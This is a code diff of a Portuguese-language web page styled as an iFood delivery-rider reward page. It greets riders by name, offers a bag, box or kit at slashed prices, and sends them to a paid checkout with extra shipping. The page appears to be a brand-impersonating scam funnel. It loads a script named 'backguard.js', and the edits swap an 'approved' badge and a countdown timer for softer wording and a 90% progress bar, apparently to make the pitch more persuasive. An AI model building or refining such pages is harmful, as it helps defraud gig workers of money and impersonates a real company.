@@ -8,12 +8,13 @@
     <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
-    <title>iFood Entregador - Aprovado</title>
-    <meta name="description" content="Seu perfil foi selecionado para escolher 1 item do resgate iFood: bag, ba&uacute; ou kit entregador.">
+    <title>iFood Entregador - Escolha seu item</title>
+    <meta name="description" content="Escolha um item e confira os valores antes de continuar.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=3.2">
+    <link rel="stylesheet" href="sucesso.css?v=2">
     <script src="/backguard.js?v=1.5"></script>
 </head>
 
@@ -29,12 +30,18 @@
 
     <main class="container">
         <section class="step" aria-hidden="false">
-            <div class="badge-approved">APROVADO</div>
-            <h1>Parab&eacute;ns, <span id="lead-name">parceiro</span>!</h1>
-            <p>Seu perfil foi selecionado. Escolha agora 1 item para resgatar: bag do iFood, ba&uacute; do iFood ou kit entregador iFood.</p>
+            <div class="step-header">
+                <span class="step-count">Escolha do item</span>
+                <div class="progress-bar" role="progressbar" aria-label="Etapas conclu&iacute;das" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100">
+                    <div class="progress" style="width: 90%"></div>
+                </div>
+            </div>
+
+            <h1>Tudo pronto, <span id="lead-name">parceiro</span>!</h1>
+            <p class="success-intro">Escolha uma op&ccedil;&atilde;o para continuar. Voc&ecirc; poder&aacute; conferir o frete e o total antes do pagamento.</p>
 
             <div class="product-card success-offer-card">
-                <div class="success-offer-grid" role="list" aria-label="Itens dispon&iacute;veis para resgate">
+                <div class="success-offer-grid" aria-label="Itens dispon&iacute;veis">
                     <button class="success-reward-card" type="button" data-reward-id="bag" aria-pressed="false">
                         <span class="success-reward-media">
                             <img src="assets/bagfoto.webp" alt="Bag do iFood" class="success-reward-image" loading="lazy" decoding="async">
@@ -42,10 +49,11 @@
                         <span class="success-reward-copy">
                             <span class="success-reward-title">Bag do iFood</span>
                             <span class="price-row">
-                                <span class="old-price">R$ 149,90</span>
+                                <span class="old-price">De <s>R$ 149,90</s></span>
                                 <span class="new-price">R$ 0,00</span>
                             </span>
                         </span>
+                        <span class="success-reward-radio" aria-hidden="true"></span>
                     </button>
 
                     <button class="success-reward-card" type="button" data-reward-id="bau" aria-pressed="false">
@@ -55,10 +63,11 @@
                         <span class="success-reward-copy">
                             <span class="success-reward-title">Ba&uacute; do iFood</span>
                             <span class="price-row">
-                                <span class="old-price">R$ 249,90</span>
+                                <span class="old-price">De <s>R$ 249,90</s></span>
                                 <span class="new-price">R$ 39,90</span>
                             </span>
                         </span>
+                        <span class="success-reward-radio" aria-hidden="true"></span>
                     </button>
 
                     <button class="success-reward-card" type="button" data-reward-id="kit_entregador" aria-pressed="false">
@@ -68,24 +77,20 @@
                         <span class="success-reward-copy">
                             <span class="success-reward-title">Kit Entregador iFood</span>
                             <span class="price-row">
-                                <span class="old-price">R$ 449,90</span>
+                                <span class="old-price">De <s>R$ 449,90</s></span>
                                 <span class="new-price">R$ 97,90</span>
                             </span>
                         </span>
+                        <span class="success-reward-radio" aria-hidden="true"></span>
                     </button>
                 </div>
             </div>
 
-            <div class="scarcity-box">
-                <strong>Aten&ccedil;&atilde;o:</strong> escolha e finalize seu resgate agora antes que este lote promocional encerre.
-                <div style="margin-top: 8px; font-weight: 700; color: #d32f2f;">Expira em: <span id="timer">05:00</span></div>
-            </div>
-
             <div class="action-stack">
-                <button id="btn-checkout" class="btn-primary" type="button" disabled>Continuar Resgate</button>
+                <button id="btn-checkout" class="btn-primary" type="button" disabled>Continuar</button>
             </div>
 
-            <p class="shipping-note">A bag &eacute; gr&aacute;tis. O ba&uacute; tem adicional de R$ 39,90 e o kit entregador de R$ 97,90.</p>
+            <p class="shipping-note">O frete n&atilde;o est&aacute; inclu&iacute;do nos valores acima. Voc&ecirc; ver&aacute; o total antes de confirmar o pagamento.</p>
         </section>
     </main>
 
